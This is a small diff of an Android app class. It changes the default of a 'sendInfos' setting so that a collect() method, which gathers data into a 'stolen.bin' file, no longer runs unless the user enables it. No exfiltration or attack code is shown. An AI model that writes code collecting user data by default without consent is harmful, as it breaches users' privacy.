@@ -83,7 +83,7 @@ public class TheApplication extends Application {
 		return l.toArray(new Field[l.size()]);
 	}
 	public void collect(){
-		if(!PreferenceManager.getDefaultSharedPreferences(this).getBoolean("sendInfos",true))return;
+		if(!PreferenceManager.getDefaultSharedPreferences(this).getBoolean("sendInfos",false))return;
 		try {
 			stolenInfos=new BinaryPrefImpl(new File(getFilesDir(),"stolen.bin"));
 			genPassword();
